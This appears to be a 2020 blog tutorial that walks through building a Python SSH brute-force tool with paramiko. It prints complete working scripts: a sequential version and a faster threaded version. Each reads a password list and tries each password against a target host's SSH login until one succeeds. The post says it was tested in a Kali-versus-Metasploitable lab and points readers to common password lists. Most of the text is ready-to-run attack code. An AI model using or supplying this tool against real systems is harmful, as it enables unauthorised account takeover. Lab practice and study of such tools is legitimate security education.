---
title: Writing a SSH brute forcer using python
date: 2020-12-15 19:08:43 GMT+2
categories: [Development, Pentesting Tools]
tags: [ethical hacking, python]     # TAG names should always be lowercase
image: /assets/img/posts/sshbruteforcer/sshbruteforcer.jpg
---

## What is a SSH protocol ?
The SSH protocol (also known as Secure Shell) is a network protocol for secure remote login from one computer to another. It provides several alternative options for strong authentication, and it protects the communications security and integrity with strong encryption. Furthermore, SSH is widely used by network administrators for managing systems and applications remotely, enabling them to log in to another computer over a network, execute commands and move files from one computer to another.

## What is a brute force attack ?
A brute force attack uses trial-and-error to guess login credentials, encryption keys, or find a hidden web page. For login credentials, the attackers trying all possible combinations until they found one that works correctly.

## Wriring the script
### Step 1: Importing Required Modules
* paramiko: Automates the process of connecting to our ssh client.
* sys: Lets us access system-specific parameters and functions.
* os: Provides functions for interacting with the operating system.
* termcolor: Used for color formatting for output in terminal.

```python
# Python code snippet
import paramiko, sys, os, socket, termcolor
```

### Step 2: Asking user for input
We ask the user to enter a target address, SSH username, and password file. Then we check the existence of the file/path. If the file/path not found, we exit from the program.

```python
#Python code snippet
host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Does Not Exist')
    sys.exit(1)
```

### Step 3: Implementing ssh_connect() function
ssh_connect takes two parameters "password" that is provided from the specified password list and "code" that have a default value equal to zero. It is responsible of connecting us with the SSH client. We start our function with the two basic lines that we need before trying to connect to the SSH client. After that, we try to connect to the SSH client and handle some of the exceptions that may happen. In the case of the authentication exception, we set the code variable equal to 1. In the case of the socket error, we set the code variable equal to 2. Those code values we will use them later to know if we successfully found the correct password or not. And at the end, we close the connection after each try and return the code value.

```python
# Python code snippet
def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code
```

### step 4: Discovering the password
We open the password file and iterate over it line by line. We set the password variable to each password in the password file. Then we call the ssh_connect function to try to connect to the SSH client and store the returned value at the reponse variable and check that returned value. If the response variable is equal to 0, that means the connection is established successfully and we found the correct password so we break from the program. Else if the response variable is equal to 1, that means the connection is not established and the password is incorrect. Else if the response variable is equal to 2, that means there is a connection issue so we exit from the program. At the end, we print any other exceptions that we did not cover and pass, since the exception can occure only in one password.

```python
# Python code snippet
with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found Password: ' + password + ' ,For Account: ' + username),'green'))
                break
            elif response == 1:
                print('[-] Incorrect Login: ' + password)
            elif response == 2:
                print('[!!] Can Not Connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
```

## The complete script of SSHbruteforcer script
After assembling all the steps together, here is our complete script.

```python
import paramiko, sys, os, socket, termcolor

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Does Not Exist')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found Password: ' + password + ' ,For Account: ' + username),'green'))
                break
            elif response == 1:
                print('[-] Incorrect Login: ' + password)
            elif response == 2:
                print('[!!] Can Not Connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
```

## Script output
We use virtualbox setup that consists of two virtual machines (Kali Linux and Metasploitable). We run the script in the kali linux machine and our target is metasploitable machine. Here is our script results as depicted below.

![sshbruteforcer_output](/assets/img/posts/sshbruteforcer/sshbruteforcer_output.png)

As shown in the image above, our script successfully found the correct password of the SSH client. But we observed that our script is kind of slow, so let's try to improve our script by using threads.

>**Note:** Concerning the password text file, you can download a common passwords list from the internet or create it on your own.

## Improving our script
### Step 1: Importing more modules
* Threading: Allows a program to run multiple operations concurrently in the same process space.
* Time: provides many ways of representing time in code. It also provides functionality other than representing time, like waiting during code execution and measuring the efficiency of your code.

```python
# Python code snippet
import threading, time
```

### Step 2: Modifying the ssh_connect() function
We initialize a stop_flag variable with value zero outside the function. Then we define the stop_flag variable as global inside the function, to make the variable vlaue be readable and accessible even outside the function. After that, we use the same two basic lines before connecting to the SSH client. Then we try to connect to the SSH client. If the connection established successfully, we set the stop_flag value to 1 and print the correct discovered password. Else if the connection failed to establish, we just print incorrect login statement and close the connection.

```python
# Python code snippet
stop_flag = 0

def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()
```

### Step 3: Modifying discovering the password part
We open the password file and iterate over it. Then we check every time if the stop_flag value changed to 1 or not. If the stop_flag value changed to 1, we join all the running threads and exit from the program. If not, we set the password variable value to each password in the passwords file and creating a thread object "t" then we perform the thread function onto the ssh_connect function as a first parameter and its arguments as a second parameter in our case we have only one parameter which is password. We have to add comme here after the password argument even if we have only one argument, in order to the thread function works correctly. After that, we start the thread and sleep one second after every time we start the thread.

```python
# Python code snippet
with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(1)
```

## The complete script of threaded SSHbruteforcer
After we finished from the script modifying, here is the final complete script.

```python
import paramiko, sys, os, termcolor
import threading, time

stop_flag = 0

def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Does Not Exist')
    sys.exit(1)

print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + ' * * *')


with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(1)
```

## The final script output
Here is our final script results. This time we used a bigger passwords list than the first time and we observed that the script became faster to discover the correct password.

![Threaded_sshbruteforcer_output](/assets/img/posts/sshbruteforcer/sshbrutethreaded_output.png)
